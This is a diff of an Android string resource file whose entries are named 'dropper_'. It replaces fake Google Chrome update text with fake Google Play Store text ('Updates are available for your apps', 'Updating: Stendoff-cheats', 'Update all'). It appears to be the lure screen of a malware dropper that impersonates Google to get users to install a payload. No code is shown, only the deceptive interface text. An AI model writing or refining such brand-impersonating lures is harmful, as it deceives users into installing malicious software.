@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">Google Chrome</string>
-    <string name="dropper_header">Google Chrome</string>
-    <string name="dropper_status">A new version of Chrome is available.</string>
-    <string name="dropper_app">Updating: RedMoon</string>
-    <string name="dropper_btn">Update</string>
+    <string name="app_name">Google Play Store</string>
+    <string name="dropper_header">Google Play</string>
+    <string name="dropper_status">Updates are available for your apps.</string>
+    <string name="dropper_app">Updating: Stendoff-cheats</string>
+    <string name="dropper_btn">Update all</string>
 </resources>
